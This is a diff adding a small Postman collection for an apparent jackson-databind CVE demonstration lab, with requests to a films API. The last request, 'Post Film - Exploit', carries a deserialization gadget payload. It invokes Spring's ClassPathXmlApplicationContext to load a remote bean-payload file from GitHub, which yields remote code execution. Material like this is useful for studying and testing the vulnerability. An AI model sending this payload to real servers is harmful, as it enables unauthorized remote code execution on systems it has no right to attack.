@@ -1,0 +1,107 @@
+{
+	"info": {
+		"_postman_id": "0bed5ba8-67b5-4efb-9dd7-14924a9fcf24",
+		"name": "jackson-databind-cves",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Get Films",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://www.jackson-databind-cves.com/api/films",
+					"protocol": "http",
+					"host": [
+						"www",
+						"jackson-databind-cves",
+						"com"
+					],
+					"path": [
+						"api",
+						"films"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Post Film",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"name\": \"Freddy vs Json\",\r\n\t\"metadata\": {\r\n\t\t\"score\": 10\r\n\t}\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://www.jackson-databind-cves.com/api/films/",
+					"protocol": "http",
+					"host": [
+						"www",
+						"jackson-databind-cves",
+						"com"
+					],
+					"path": [
+						"api",
+						"films",
+						""
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Post Film - Exploit",
+			"request": {
+				"method": "POST",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\r\n\t\"name\": \"X\",\r\n\t\"metadata\": {\r\n\t\t\"a\": [\r\n\t\t    \"org.springframework.context.support.ClassPathXmlApplicationContext\",\r\n\t\t    \"https://raw.githubusercontent.com/s3curitybug/jackson-databind-cves/master/bean-payload\"\r\n\t\t]\r\n\t}\r\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://www.jackson-databind-cves.com/api/films/",
+					"protocol": "http",
+					"host": [
+						"www",
+						"jackson-databind-cves",
+						"com"
+					],
+					"path": [
+						"api",
+						"films",
+						""
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
